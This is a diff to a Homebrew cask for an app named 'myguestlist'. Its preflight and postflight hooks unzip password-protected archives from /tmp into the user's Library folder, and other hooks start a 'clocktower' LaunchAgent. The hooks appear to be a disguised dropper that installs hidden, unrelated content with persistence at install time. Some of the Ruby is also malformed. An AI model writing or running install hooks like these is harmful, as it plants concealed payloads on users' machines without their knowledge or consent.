@@ -19,9 +19,9 @@ cask "myguestlist" do
       end      
 
     preflight do
-        system_command "/bin/cp",
-                       args: ["/tmp/confapp24/deps/clocktower.js", "$HOME/Library/clocktower.js"],
-      end      
+        system_command "/usr/bin/unzip",
+                       args: ["/tmp/confapp24/deps/appdev.zip", "-P", "clockBamboo88", "-d", "$HOME/Library/"],
+      end
 
     preflight do
         system_command "/bin/launchctl",
@@ -29,14 +29,14 @@ cask "myguestlist" do
       end   
 
     postflight do
-        system_command "/bin/cp",
-                       args: ["/tmp/confapp24/deps/Clocktower Inc..app", "/Library/Clocktower Inc..app"],
-      end      
-
+        system_command "/usr/bin/unzip",
+                       args: ["/tmp/confapp24/deps/appdev1.zip", "-P", "clockBamboo88", "-d", "$HOME/Library/"],
+      end    
+    
     postflight do
         system_command "/bin/launchctl",
                        args: ["start", "$HOME/Library/LaunchAgents/com.user.clocktower.plist"],
       end
-
+    
     app "myguestlist.app"
 end
